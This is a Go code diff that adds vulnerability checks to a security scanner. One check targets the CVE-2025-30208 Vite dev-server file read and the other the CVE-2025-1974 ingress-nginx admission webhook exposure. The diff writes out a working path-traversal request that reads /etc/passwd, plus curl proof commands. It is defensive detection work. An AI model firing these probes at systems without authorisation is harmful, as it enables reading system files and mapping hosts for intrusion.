@@ -1165,7 +1165,44 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 	// ── Vite dev server ───────────────────────────────────────────────────────
 	case 5173:
 		if probeHTTP(ctx, asset, port, false, "/__vite_ping") {
-			return []finding.Finding{makeF(
+			var findings []finding.Finding
+
+			// CVE-2025-30208: /@fs/ path traversal with double-? query confusion.
+			// Vite's ensureServingAccess() checks for ?import in the query string
+			// via a regex that is confused by a trailing bare ?. Sending
+			// /@fs/etc/passwd?import&raw?? causes Vite to return the file contents
+			// as a JS module: export default "root:x:0:0:...\n".
+			if body, ok := probeHTTPBody(ctx, asset, port, false, "/@fs/etc/passwd?import&raw??"); ok &&
+				strings.Contains(body, "export default") && strings.Contains(body, "root:") {
+				findings = append(findings, finding.Finding{
+					CheckID:  finding.CheckCVEViteFileRead,
+					Module:   "surface",
+					Scanner:  scannerName,
+					Severity: finding.SeverityCritical,
+					Title:    fmt.Sprintf("CVE-2025-30208: Vite dev server arbitrary file read on port %d", port),
+					Description: fmt.Sprintf(
+						"The Vite development server on %s:%d is vulnerable to CVE-2025-30208 — "+
+							"a path traversal that bypasses the /@fs/ allowlist by exploiting a regex "+
+							"confusion via a double-question-mark in the query string. "+
+							"The probe retrieved /etc/passwd as a JS module. "+
+							"Affects Vite < 6.2.4 / < 6.1.3 / < 6.0.12 / < 5.4.15 / < 4.5.10. "+
+							"Upgrade Vite and never expose dev servers publicly.",
+						asset, port,
+					),
+					Asset: asset,
+					Evidence: map[string]any{
+						"url":          fmt.Sprintf("http://%s:%d/@fs/etc/passwd?import&raw??", asset, port),
+						"body_excerpt": body[:min(len(body), 256)],
+					},
+					ProofCommand: fmt.Sprintf(
+						"curl -s 'http://%s:%d/@fs/etc/passwd?import&raw??'",
+						asset, port,
+					),
+					DiscoveredAt: now,
+				})
+			}
+
+			findings = append(findings, makeF(
 				finding.CheckPortDevServerExposed,
 				finding.SeverityHigh,
 				fmt.Sprintf("Vite development server exposed on port %d", port),
@@ -1173,7 +1210,46 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 					"expose unminified source code, internal file paths, environment variables embedded in code, "+
 					"and the /__vite_ping health endpoint. Production deployments should never expose dev servers.",
 				map[string]any{"port": port, "service": service, "banner": banner},
-			)}
+			))
+			return findings
+		}
+
+	// ── ingress-nginx admission webhook (CVE-2025-1974, IngressNightmare) ────
+	// The ingress-nginx admission controller webhook listens on port 8443 and
+	// processes AdmissionReview requests without requiring network policy or
+	// client-certificate authentication. Internet exposure allows pre-auth RCE
+	// via a crafted nginx configuration directive embedded in an Ingress object.
+	// Probe: POST a stub AdmissionReview — legitimate webhook responses contain
+	// "AdmissionReview" or "admission.k8s.io" even for malformed requests.
+	case 8443:
+		if body := probeIngressAdmissionWebhook(ctx, asset, port); body != "" {
+			return []finding.Finding{{
+				CheckID:  finding.CheckCVEIngressNightmare,
+				Module:   "surface",
+				Scanner:  scannerName,
+				Severity: finding.SeverityCritical,
+				Title:    fmt.Sprintf("CVE-2025-1974 (IngressNightmare): ingress-nginx admission webhook exposed on port %d", port),
+				Description: fmt.Sprintf(
+					"%s has the ingress-nginx admission controller webhook accessible on port %d. "+
+						"CVE-2025-1974 allows an unauthenticated attacker to send a crafted AdmissionReview "+
+						"request containing a malicious nginx configuration directive, achieving remote code "+
+						"execution in the ingress-nginx pod. The webhook should never be internet-accessible — "+
+						"restrict port 8443 to the Kubernetes API server CIDR only via NetworkPolicy.",
+					asset, port,
+				),
+				Asset: asset,
+				Evidence: map[string]any{
+					"port":          port,
+					"service":       "ingress-nginx-admission-webhook",
+					"response_body": body[:min(len(body), 256)],
+				},
+				ProofCommand: fmt.Sprintf(
+					`curl -sk -X POST https://%s:%d/admission -H 'Content-Type: application/json' `+
+						`-d '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview"}'`,
+					asset, port,
+				),
+				DiscoveredAt: now,
+			}}
 		}
 
 	// ── Gradio ML demo server ─────────────────────────────────────────────────
@@ -1706,6 +1782,48 @@ func probeHTTP(ctx context.Context, host string, port int, useTLS bool, path str
 	}
 	defer resp.Body.Close()
 	return resp.StatusCode == http.StatusOK
+}
+
+// probeIngressAdmissionWebhook probes port 8443 for an exposed ingress-nginx
+// admission controller webhook (CVE-2025-1974, IngressNightmare). It POSTs a
+// minimal AdmissionReview JSON and returns the response body if the endpoint
+// looks like a Kubernetes admission webhook (body contains "AdmissionReview"
+// or "admission.k8s.io"). Returns "" when no webhook is detected.
+func probeIngressAdmissionWebhook(ctx context.Context, host string, port int) string {
+	url := fmt.Sprintf("https://%s:%d/admission", host, port)
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+		DialContext:     (&net.Dialer{Timeout: dialTimeout}).DialContext,
+	}
+	client := &http.Client{
+		Timeout:   httpTimeout,
+		Transport: transport,
+		CheckRedirect: func(*http.Request, []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+	body := `{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{}}`
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url,
+		strings.NewReader(body))
+	if err != nil {
+		return ""
+	}
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := client.Do(req)
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+	b, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
+	if err != nil {
+		return ""
+	}
+	s := string(b)
+	if strings.Contains(s, "AdmissionReview") || strings.Contains(s, "admission.k8s.io") ||
+		strings.Contains(s, "admission") && strings.Contains(s, "ingress") {
+		return s
+	}
+	return ""
 }
 
 // probeMemcached sends the ASCII stats command and checks for STAT in the response.
